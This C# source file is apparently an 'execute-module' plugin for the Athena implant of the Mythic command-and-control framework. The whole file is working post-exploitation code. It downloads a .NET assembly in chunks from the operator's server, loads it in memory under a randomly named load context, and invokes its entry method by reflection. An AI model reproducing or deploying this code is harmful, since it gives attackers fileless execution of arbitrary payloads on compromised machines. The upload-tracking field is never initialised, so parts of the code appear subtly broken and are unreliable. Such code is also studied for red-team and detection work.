using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using execute_module;
using System.Collections.Concurrent;
using System.IO;
using System.Reflection;
using System.Runtime.Loader;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IFilePlugin
    {
        public string Name => "execute-module";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private IAgentConfig config { get; set; }
        private AssemblyLoadContext assemblyLoadContext = new AssemblyLoadContext(Misc.RandomString(10));
        //Name, Module
        private Dictionary<string, ExecModuleArgs> module_tasks = new Dictionary<string, ExecModuleArgs>();
        private List<AthenaModule> modules = new List<AthenaModule>();
        private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
            this.config = config;
        }

        public async Task Execute(ServerJob job)
        {
            ExecModuleArgs args = JsonSerializer.Deserialize<ExecModuleArgs>(job.task.parameters);

            if(args is null)
            {
                await messageManager.AddResponse(new DownloadTaskResponse
                {
                    status = "error",
                    user_output = "failed to parse args.",
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                return;
            }

            //The operator indicated that the module has already been loaded
            if (string.IsNullOrEmpty(args.file))
            {
                this.module_tasks.Add(job.task.id, args);
                if(this.modules.Where(x=>x.name == args.name).Count() <= 0)
                {
                    await messageManager.AddResponse(new DownloadTaskResponse
                    {
                        status = "error",
                        user_output = "Module not loaded.",
                        completed = true,
                        task_id = job.task.id
                    }.ToJson());
                    return;
                }


                if(!await this.ExecuteModule(args.name, job.task.id))
                {
                    await messageManager.AddResponse(new DownloadTaskResponse
                    {
                        status = "error",
                        user_output = "Failed to execute module.",
                        completed = true,
                        task_id = job.task.id
                    }.ToJson());
                    return;
                }

                this.module_tasks.Remove(job.task.id);
            }
            //Start new module loading process
            else
            {
                //Create new object to store the loaded module
                AthenaModule mod = new AthenaModule()
                {
                    name = args.name,
                    entrypoint = args.entrypoint,
                };

                //Add module to our trackers, one for the task, and one for the module contents
                this.modules.Add(mod);
                this.module_tasks.Add(job.task.id, args);

                //Start Download
                ServerUploadJob uploadJob = new ServerUploadJob(job, config.chunk_size);
                uploadJob.file_id = args.file;
                uploadJob.chunk_num = 1;

                //Add job to our tracker
                if (!uploadJobs.TryAdd(job.task.id, uploadJob))
                {
                    await messageManager.AddResponse(new DownloadTaskResponse
                    {
                        status = "error",
                        user_output = "failed to add job to tracker",
                        completed = true,
                        task_id = job.task.id
                    }.ToJson());
                    return;
                }

                //Kick off the file transfer process
                await messageManager.AddResponse(new UploadTaskResponse
                {
                    task_id = job.task.id,
                    upload = new UploadTaskResponseData
                    {
                        chunk_size = uploadJob.chunk_size,
                        chunk_num = uploadJob.chunk_num,
                        file_id = uploadJob.file_id,
                        full_path = string.Empty,
                    },
                    user_output = string.Empty
                }.ToJson());
            }
        }

        public async Task HandleNextMessage(ServerTaskingResponse response)
        {
            ServerUploadJob uploadJob = this.GetJob(response.task_id);

            //Did we get an upload job
            if (uploadJob is null)
            {
                await messageManager.AddResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Failed to get job",
                }.ToJson());
                return;
            }

            //Did user request cancellation of the job?
            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                await messageManager.AddResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Cancellation Requested",
                }.ToJson());
                this.CompleteUploadJob(response.task_id);
                return;
            }

            //Update the chunks required for the upload
            if (uploadJob.total_chunks == 0)
            {
                if (response.total_chunks == 0)
                {
                    await messageManager.AddResponse(new TaskResponse
                    {
                        status = "error",
                        completed = true,
                        task_id = response.task_id,
                        user_output = "Failed to get number of chunks",
                    }.ToJson());
                    return;
                }

                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
            }

            //Did we get chunk data?
            if (String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                await messageManager.AddResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "No chunk data received.",

                }.ToJson());
                return;
            }

            string module_name = this.module_tasks[uploadJob.task.id].name;

            //Write the chunk data to our stream
            if (!this.HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), module_name))
            {
                await messageManager.AddResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Failed to process message.",
                }.ToJson());
                this.CompleteUploadJob(response.task_id);
                return;
            }

            //Increment chunk number for tracking
            uploadJob.chunk_num++;

            //Prepare response to Mythic
            UploadTaskResponse ur = new UploadTaskResponse()
            {
                task_id = response.task_id,
                status = $"Processed {uploadJob.chunk_num}/{uploadJob.total_chunks}",
                upload = new UploadTaskResponseData
                {
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    chunk_size = uploadJob.chunk_size,
                    full_path = uploadJob.path
                }
            };

            //Check if we're done
            if (response.chunk_num == uploadJob.total_chunks)
            {
                ur = new UploadTaskResponse()
                {
                    task_id = response.task_id,
                    upload = new UploadTaskResponseData
                    {
                        file_id = uploadJob.file_id,
                        full_path = uploadJob.path,
                    },
                    completed = true
                };
                await this.ExecuteModule(module_name, response.task_id);
                this.CompleteUploadJob(response.task_id);
            }

            //Return response
            await messageManager.AddResponse(ur.ToJson());
        }
        private bool HandleNextChunk(byte[] bytes, string module_name)
        {
            AthenaModule mod = this.modules.Where(x => x.name == module_name).FirstOrDefault();
            mod.fContent.AddRange(bytes);
            return true;
        }

        private ServerUploadJob GetJob(string task_id)
        {
            return this.uploadJobs[task_id];
        }

        private async Task<bool> ExecuteModule(string module_name, string task_id)
        {
            var mod = this.modules.Where(x => x.name == module_name).FirstOrDefault();

            try
            {
                if(mod.asm is null)
                {
                    if (mod.fContent.Count() <= 0)
                    {
                        return false;
                    }
                    mod.asm = assemblyLoadContext.LoadFromStream(new MemoryStream(mod.fContent.ToArray()));
                }

                MethodInfo method = FindMethodInNamespace(mod.asm, mod.entrypoint);

                if (method is null)
                {
                    //do some error stuff
                    return false;
                }

                var result = method.Invoke(null, new object[] { task_id, module_tasks[task_id].GetArgs() });
                return true;
            }
            catch (Exception e)
            {
                await messageManager.WriteLine(e.ToString(), task_id, true, "error");
            }

            return false;
        }

        /// <summary>
        /// Complete and remove the upload job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the upload job to complete</param>
        private void CompleteUploadJob(string task_id)
        {
            if (!uploadJobs.ContainsKey(task_id))
            {
                return;
            }

            uploadJobs.Remove(task_id, out _);
            module_tasks.Remove(task_id, out _);

            this.messageManager.CompleteJob(task_id);
        }

        private static MethodInfo? FindMethodInNamespace(Assembly assembly, string  methodName)
        {
            // Search for the method in all types
            MethodInfo? targetMethod = null;

            foreach (Type type in assembly.GetTypes())
            {
                targetMethod = type.GetMethod(methodName, BindingFlags.Public | BindingFlags.Static);

                // Check if the method exists and matches the desired signature
                if (targetMethod != null)
                {
                    return targetMethod;
                }
            }
            return null;
        }
    }
}
